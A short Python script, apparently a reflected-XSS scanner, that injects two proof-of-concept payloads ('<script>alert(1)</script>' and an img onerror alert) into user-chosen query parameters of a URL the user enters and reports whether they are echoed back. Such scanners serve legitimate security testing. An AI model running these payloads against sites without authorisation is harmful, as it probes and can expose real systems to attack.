import requests
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

# List of XSS payloads to test
payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

# Function to scan a URL for RXSS vulnerabilities
def scan_url(url, params):
    print(f"Scanning {url} for RXSS vulnerabilities...")
    
    for payload in payloads:
        for param in params:
            # Parse the URL to extract components
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            # Inject the payload into the specified parameter
            if param in query_params:
                query_params[param] = query_params[param][0] + payload
            else:
                query_params[param] = payload

            # Construct the modified URL
            modified_query = urlencode(query_params, doseq=True)
            modified_url = urlunparse(parsed_url._replace(query=modified_query))
            
            try:
                # Send the request with the injected payload
                response = requests.get(modified_url)

                # Check if the payload is reflected in the response and if the status code is 200
                if response.status_code == 200 and payload in response.text:
                    print(f"Vulnerable with XSS: Payload '{payload}' in {modified_url}")
                else:
                    print(f"Not Vulnerable: Payload '{payload}' in {modified_url} - Status Code: {response.status_code}")
                    
            except Exception as e:
                print(f"Error occurred while scanning {modified_url}: {e}")

# Example usage
if __name__ == "__main__":
    target_url = input("Enter the URL to scan: ")
    params = input("Enter the URL parameters to test, separated by commas: ").split(',')
    scan_url(target_url, params)
